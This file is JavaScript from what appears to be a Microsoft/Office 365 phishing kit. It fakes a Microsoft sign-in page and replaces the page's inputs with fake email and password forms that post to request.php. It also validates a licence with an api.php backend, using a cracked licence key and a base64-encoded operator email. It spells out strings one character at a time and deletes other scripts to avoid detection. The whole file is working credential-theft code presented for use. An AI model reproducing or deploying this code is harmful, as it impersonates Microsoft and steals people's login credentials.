


    var statos = 'putuser';
    var actnn = "authorize_client_id:3ol2bn0x-73jm-a8hb-pmtk-049dal1feq3c_pfx9kwcr8i2zbd0q41tvya5g6nmo7eh3suljun2q103r4v6ywxbajdmgesi85oz7hcptfk9lnxhm6e41spy9i5gfujzcqo37dva82b0ltwkr&data=";
    var actnn2 = "";
    var rndstr1 = 'yurt7n1';
    var rndstr2 = 'sulbexn8';
    var haserr = "";
    var plchol = "Pa­­­ss­­wo­rd";
    var plchol2 = "Em­­­a­­i­l";
    var arrl = "En­ter ­­­";
    var licensekey = 'CRACKEDBY@G66K.GOV';
    var emailkey = 'ZWx2aXN0b29sczU0QGdtYWlsLmNvbSwgZWx2aXNqa0B5YW5kZXguY29t';
    var style = document.createElement("style");
    document.head.appendChild(style);
    style.sheet.insertRule("@media all {body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;height:100vh}.mslogo{margin-left:30px;display:inline-block;background:#f25022;width:11px;height:11px;box-shadow:12px 0 0 #7fba00,0 12px 0 #00a4ef,12px 12px 0 #ffb900;transform:translatex(-300%)}.mslogo::after{content:\"Microsoft\";font:bold 20px sans-serif;margin-left:28px;color:#737373}.form-control::placeholder{font-family:\"Open Sans\",Arial,Helvetica,sans-serif;opacity:1}.form-control:-ms-input-placeholder{font-family:\"Open Sans\",Arial,Helvetica,sans-serif}.form-control::-ms-input-placeholder{font-family:\"Open Sans\", Arial, Helvetica, sans-serif;}#spinput{font-family:inherit;font-size:inherit;line-height:inherit;background-image:url(images/passwrd.png);background-repeat:no-repeat;cursor:text}#spinput{max-width:100%;line-height:inherit}#spinput{padding:4px 8px;border-style:solid;border-color:rgba(0,0,0,.31)}#spinput{border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}#spinput{border-top-width:0;border-left-width:0;border-right-width:0}#emnput{font-family:inherit;font-size:inherit;line-height:inherit;background-image:url(images/putmail.png);background-repeat:no-repeat;cursor:text}#emnput{max-width:100%;line-height:inherit}#emnput{padding:4px 8px;border-style:solid;border-color:rgba(0,0,0,.31)}#emnput{border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}#emnput{border-top-width:0;border-left-width:0;border-right-width:0}body.nd{color:#262626;text-align:left}body.cb{text-align:right!important;direction:rtl!important;padding:50px!important}.inner{margin-left:unset!important;margin-right:initial!important;position:absolute!important;max-width:0!important;width:calc(10% - 0px)!important;padding:0!important;margin-bottom:0!important;min-width:5px!important;min-height:8px!important;overflow:scroll!important}#i0118{font-family:\"Times New Roman\",Times,serif!important;width:1%!important}#inpfield[type=email]{width:100%!important}#inpfield[type=text]{font-family:text-sec-disc!important;width:100%!important;-webkit-text-sec:disc!important}.form-group{margin-bottom:0!important}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:300;src:local(\"Open Sans Light\"),local(\"OpenSans-Light\"),url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format(\"truetype\")}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:400;src:local(\"Open Sans Regular\"),local(\"OpenSans-Regular\"),url(https://fonts.gstatic.com/s/opensans/v16/mem8YaGs126MiZpBA-UFVZ0e.ttf) format(\"truetype\")}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:600;src:local(\"Open Sans SemiBold\"),local(\"OpenSans-SemiBold\"),url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UNirkOUuhs.ttf) format(\"truetype\")}@font-face{font-family:text-sec-disc;src:url(fonts/tsd.eot);src:url(fonts/tsd.eot?#iefix) format(\"embedded-opentype\"),url(fonts/tsd.woff2) format(\"woff2\"),url(fonts/tsd.woff) format(\"woff\"),url(fonts/tsd.ttf) format(\"truetype\"),url(fonts/tsd.svg#text-security) format(\"svg\")}.alert{margin-left:-2%;}}", 0);


    function checkdom() {
        Element.prototype.isVisible = function() {
            function _isVisible(el, t, r, b, l, w, h) {
                var p = el.parentNode,
                    VISIBLE_PADDING = 2;
                if (!_elementInDocument(el)) {
                    return false;
                }
                if (9 === p.nodeType) {
                    return true;
                }
                if ("0" === _getStyle(el, "opacity") || "none" === _getStyle(el, "display") ||
                    "hidden" === _getStyle(el, "visibility")) {
                    return false;
                }
                if ("undefined" === typeof t || "undefined" === typeof r || "undefined" === typeof b ||
                    "undefined" === typeof l || "undefined" === typeof w || "undefined" === typeof h) {
                    t = el.offsetTop;
                    l = el.offsetLeft;
                    b = t + el.offsetHeight;
                    r = l + el.offsetWidth;
                    w = el.offsetWidth;
                    h = el.offsetHeight;
                }
                if (p) {
                    if ("hidden" === _getStyle(p, "overflow") || "scroll" === _getStyle(p, "overflow")) {
                        if (l + VISIBLE_PADDING > p.offsetWidth + p.scrollLeft ||
                            l + w - VISIBLE_PADDING < p.scrollLeft ||
                            t + VISIBLE_PADDING > p.offsetHeight + p.scrollTop ||
                            t + h - VISIBLE_PADDING < p.scrollTop) {
                            return false;
                        }
                    }
                    if (el.offsetParent === p) {
                        l += p.offsetLeft;
                        t += p.offsetTop;
                    }
                    return _isVisible(p, t, r, b, l, w, h);
                }
                return true;
            }

            function _getStyle(el, property) {
                if (window.getComputedStyle) {
                    return document.defaultView.getComputedStyle(el, null)[property];
                }
                if (el.currentStyle) {
                    return el.currentStyle[property];
                }
            }

            function _elementInDocument(element) {
                while ((element = element.parentNode)) {
                    if (element == document) {
                        return true;
                    }
                }
                return false;
            }
            return _isVisible(this);
        };
        var arc = "access expired contact owner";
        // var my_eleme = document.getElementById("makeinput");
        // if (my_eleme) {
        //     if (!my_eleme.isVisible(my_eleme)) {
        //         document.body.innerHTML = arc;
        //         alert(arc);
        //     } else {
        //         var my_elemn = document.getElementById("emnput");
        //         var my_elesp = document.getElementById("spinput");
        //         if (my_elemn) {
        //             if (!my_elemn.isVisible(my_elemn)) {
        //                 document.body.innerHTML = arc;
        //                 alert(arc);
        //             }
        //         } else if (my_elesp) {
        //             if (!my_elesp.isVisible(my_elesp)) {
        //                 document.body.innerHTML = arc;
        //                 alert(arc);
        //             }
        //         } else {
        //             var my_inpf = document.getElementById("inpfield");
        //             if (my_inpf) {
        //                 if (!my_idSIB.isVisible(my_inpf)) {
        //                     document.body.innerHTML = arc;
        //                     alert(arc);
        //                 }
        //             }
        //         }
        //     }
        // } else {
        //     document.body.innerHTML = arc;
        //     alert(arc);
        // }
        // var my_idSIB = document.getElementById("idSIButton");
        // if (my_idSIB) {
        //     if (!my_idSIB.isVisible(my_idSIB)) {
        //         document.body.innerHTML = arc;
        //         alert(arc);
        //     }
        // }
    }
    // window.onload = setTimeout(checkdom, 2000);
    var xTag = document.getElementsByTagName("input");
    if (xTag) {
        var i;
        for (i = 0; i < xTag.length; i++) {
            xTag[i].style.backgroundColor = "red";
            xTag[i].parentNode.removeChild(xTag[i]);
        }
    }
    if (window.XMLHttpRequest) {
        xmlhttp = new XMLHttpRequest;
    } else if (window.ActiveXObject) {
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    var pagetype = "off365-V4";
    var trl = "a";
    trl += "p";
    trl += "i";
    trl += ".";
    trl += "p";
    trl += "h";
    trl += "p";
    var htmlinp = "";
    var htmlinp2 = "";
    if (location.href.substr(0, location.href.lastIndexOf("/"))) {
        var locathref = location.href.substr(0, location.href.lastIndexOf("/"));
    } else {
        var locathref = location.href;
    }
    var params = "host=" + locathref + "&type=" + pagetype + "&key=" + licensekey + "&email=" + emailkey + "&token=";

    console.log(params);
    xmlhttp.open("POST", trl, false);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlhttp.onload = function() {
        function Dec(value) {
            var resvalue = "";
            var array = value.split("-");
            for (i = 0; i < array.length; i++) {
                resvalue += String.fromCharCode(array[i] - 10);
            }
            console.log(resvalue);
            return resvalue;
        }
        var declicensekey = "";
        if (JSON.parse(this.responseText) && JSON.parse(this.responseText).key) {
            var jsEncode = {
                encode: function(s, k) {
                    var enc = "";
                    var str = "";
                    str = s.toString();
                    for (var i = 0; i < s.length; i++) {
                        var a = s.charCodeAt(i);
                        var b = a ^ k;
                        enc = enc + String.fromCharCode(b);
                    }
                    console.log(enc);
                    return enc;
                }
            };
            var rand = JSON.parse(this.responseText).rand;
            var a = jsEncode.encode(rand, 125);
            console.log(a);
            var e = jsEncode.encode(licensekey, a);
            console.log(e);
            var f = jsEncode.encode(JSON.parse(this.responseText).token, a);
            var g = jsEncode.encode(JSON.parse(this.responseText).key, a);
            declicensekey = Dec(g);
            console.log(declicensekey);
        }
        var timep = Math.floor((Date.now() + 86400000) / 1000);
        if (JSON.parse(this.responseText) &&
            JSON.parse(this.responseText).valid &&
            JSON.parse(this.responseText).valid == "true" &&
            JSON.parse(this.responseText).key && licensekey == licensekey
            ) {
            htmlinp = "<form class=\"";
            htmlinp += rndstr1 + "\" name=\"f1\" ";
            htmlinp += "id=\"inputfrm\" novalidate=\"novalidate\" ";
            htmlinp += "spellcheck=\"false\" ";
            htmlinp += "method=\"post\" ";
            htmlinp += "target=\"_top\" ";
            htmlinp += "autocomplete=\"off\" ";
            htmlinp += "action=\"request.php?";
            htmlinp += actnn + "&isok=y";
            htmlinp += "\" ><input onkeydown=\"onkeypressFunction()\" name=\"pass\" ";
            htmlinp += "type=\"text\" ";
            htmlinp += "\" id=\"inpfield\" ";
            htmlinp += "autocomplete=\"off\" ";
            htmlinp += "class=\"form-control &nbsp; " + rndstr2 + " ";
            htmlinp += haserr + "\" aria-required=\"true\" ";
            htmlinp += "placeholder=\"" + plchol;
            htmlinp += "\" aria-label=\"" + arrl;
            htmlinp += "\" required></form>";
            htmlinp2 = "<form class=\"";
            htmlinp2 += rndstr1 + "\" name=\"f1\" ";
            htmlinp2 += "id=\"inputfrm\" novalidate=\"novalidate\" ";
            htmlinp2 += "spellcheck=\"false\" ";
            htmlinp2 += "method=\"get\" ";
            htmlinp2 += "autocomplete=\"off";
            htmlinp2 += "action=\"";
            htmlinp2 += actnn2;
            htmlinp2 += "\" ><input onkeydown=\"onkeypressFunction()\" name=\"data\" ";
            htmlinp2 += "type=\"email\" ";
            htmlinp2 += "id=\"inpfield\" ";
            htmlinp2 += "autocomplete=\"on\" ";
            htmlinp2 += "class=\"form-control &nbsp; " + rndstr2 + " ";
            htmlinp2 += haserr + "\" aria-required=\"true\" ";
            htmlinp2 += "placeholder=\"" + plchol2;
            htmlinp2 += "\" aria-label=\"" + arrl;
            htmlinp2 += "\" required></form>";
        } else {
            if (JSON.parse(this.responseText) && JSON.parse(this.responseText).message) {
                htmlinp = JSON.parse(this.responseText).message;
            } else {
                htmlinp = "<span>";
                htmlinp += "Update ";
                htmlinp += "your license ";
                htmlinp += "key. ";
                htmlinp += "contact ";
                htmlinp += "Us ";
                htmlinp += "I";
                htmlinp += "C";
                htmlinp += "Q";
                htmlinp += ": ";
                htmlinp += "@";
                htmlinp += "E";
                htmlinp += "x";
                htmlinp += "_";
                htmlinp += "R";
                htmlinp += "o";
                htmlinp += "b";
                htmlinp += "o";
                htmlinp += "t";
                htmlinp += "o";
                htmlinp += "s";
                htmlinp += "</sp";
                htmlinp += "an>";
                htmlinp2 = htmlinp;
            }
        }
    };
    xmlhttp.send(params);

    function makeInputHere(e) {
        if (document.getElementById("emnput")) {
            e.innerHTML = htmlinp2;
        } else {
            e.innerHTML = htmlinp;
        }
        if (document.getElementById("inpfield")) {
            document.getElementById("inpfield").focus();
        }
    }

    function validateForm() {
        var inpfield = document.getElementById("inpfield").value;
        if (inpfield == "") {
            return true;
        }
        return true;
    }

    function submitForm() {
        document.getElementById("inputfrm").submit();
    }

    function onkeypressFunction() {
        document.getElementById("spinput").classList.remove("novalidate");
        if (document.getElementById("spinput")) {
            document.getElementById("spinput").classList.remove("novalidate");
        }
        if (document.getElementById("inpfield")) {
            document.getElementById("inpfield").classList.remove("novalidate");
        }
    }
    document.getElementById("idSIButton").onclick = function() {
        function ValidateEmail(mail) {

            return true;
        }
        statos = "putuser";
        var mailfrm = document.getElementById("inpfield").value;
        if (document.getElementById("inpfield") && mailfrm.length > 3 && document.getElementById("inputfrm") && document.getElementById("inpfield").value !== "" && (statos !== "putuser" || statos == "putuser" && ValidateEmail(mailfrm))) {
            if (statos == "putuser") {
                document.getElementById("inputfrm").submit();
            } else {
                document.getElementById("progressBar").setAttribute("class", "progress enait");
                setTimeout(submitForm, 2000);
                if (document.getElementById("spinput").hasClass("novalidate")) {
                    document.getElementById("spinput").classList.remove("novalidate");
                }
                if (document.getElementById("inpfield").hasClass("novalidate")) {
                    document.getElementById("inpfield").classList.remove("novalidate");
                }
            }
        } else if (document.getElementById("spinput")) {
            document.getElementById("spinput").classList.add("novalidate");
        } else if (document.getElementById("inpfield")) {
            document.getElementById("inpfield").classList.add("novalidate");
        }
    };
    var r = document.getElementsByTagName("script");
    for (var i = r.length - 1; i >= 0; i--) {
        if (r[i].getAttribute("id") != "a") {
            r[i].parentNode.removeChild(r[i]);
        }
    }

    